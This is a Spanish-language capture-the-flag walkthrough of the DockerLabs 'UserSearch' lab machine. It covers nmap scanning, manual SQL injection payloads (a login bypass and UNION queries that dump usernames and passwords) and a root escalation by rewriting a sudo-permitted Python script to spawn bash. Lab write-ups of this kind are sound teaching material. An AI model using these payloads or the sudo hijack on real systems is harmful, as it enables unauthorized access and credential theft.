#MAQUINA #DOCKERLABS #MEDIO 
#SQLI #MANUAL_SQLI
<hr>

# RECONOCIMIENTO

Vamos a resolver **UserSearch** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.18.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.18.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 11:36 CET
Initiating ARP Ping Scan at 11:36
Scanning 172.18.0.2 [1 port]
Completed ARP Ping Scan at 11:36, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:36
Scanning 172.18.0.2 [65535 ports]
Discovered open port 80/tcp on 172.18.0.2
Discovered open port 22/tcp on 172.18.0.2
Completed SYN Stealth Scan at 11:36, 0.55s elapsed (65535 total ports)
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2025-03-17 11:36:26 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:12:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.78 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.18.0.2 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 11:36 CET
Nmap scan report for 172.18.0.2
Host is up (0.000016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 ea:6b:ef:51:9c:00:c4:d4:24:17:90:be:6d:0a:26:79 (ECDSA)
|_  256 62:97:b5:91:0c:b0:8f:06:bd:ad:e3:d5:14:3d:f1:74 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: User Search
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds




```

   ```bash

nmap --script="http-enum" 172.18.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 11:37 CET
Nmap scan report for 172.18.0.2
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos que hay un login.
Si ponemos admin, nos da su contra. La probamos y nada.
# EXPLOTACION

Vemos si es vulnerable a **SQLI**:

   ```bash
admin' or 1=1 -- -
```

Nos muestra usuarios y sus contras:
```html
<p>Username: admin - Password: adminpassword</p><p>Username: user1 - Password: user1password</p><p>Username: kvzlx - Password: kvzlxpassword</p>
```

ESTAMOS COMO KVZLX al entrar vía ssh.

**PASO A PASO :** 

Vamos a hacerlo ahora paso a paso, primero vamos a ver el numero de columnas:

```bash
'order by 3 -- -
```

A partir de 3 no nos devuelve "NO RESULTS"

Ahora vamos a mostrar la db :

```bash
'union select 1,database(),3 -- -
'union select 1,group_concat(schema_name),3 from information_schema.schemata -- -
```

Se llama **testdb**.

```base
'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="testdb"-- -
```

La tabla es **users**.

```base
'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema="testdb" and table_name="users"-- -
```

Tenemos las columnas **id**, **username** y **password**.

```base
'union select 1,group_concat(username, ':', password),3 from testdb.users -- -
```

Nos saca lo mismo :
```bash
Username: admin:adminpassword,user1:user1password,kvzlx:kvzlxpassword - Password: 3
```

ESTAMOS COMO KVZLX al entrar vía ssh.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
kvzlx@657f6c597386:~$ sudo -l
Matching Defaults entries for kvzlx on 657f6c597386:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User kvzlx may run the following commands on 657f6c597386:
    (ALL) NOPASSWD: /usr/bin/python3 /home/kvzlx/system_info.py


```

Vemos **/home/kvzlx/system_info.py** con permisos SUDO, que aunque no es nuestro, como esta dentro de nuestro directorio personal podemos eliminarlo y crear otro :

   ```bash
kvzlx@657f6c597386:~$ cat system_info.py 
import os

os.execv("/bin/bash",["-p"])
kvzlx@657f6c597386:~$ sudo /usr/bin/python3 /home/kvzlx/system_info.py
root@657f6c597386:/home/kvzlx# whoami
root
root@657f6c597386:/home/kvzlx# 

```

**YA ESTAMOS COMO ROOT.**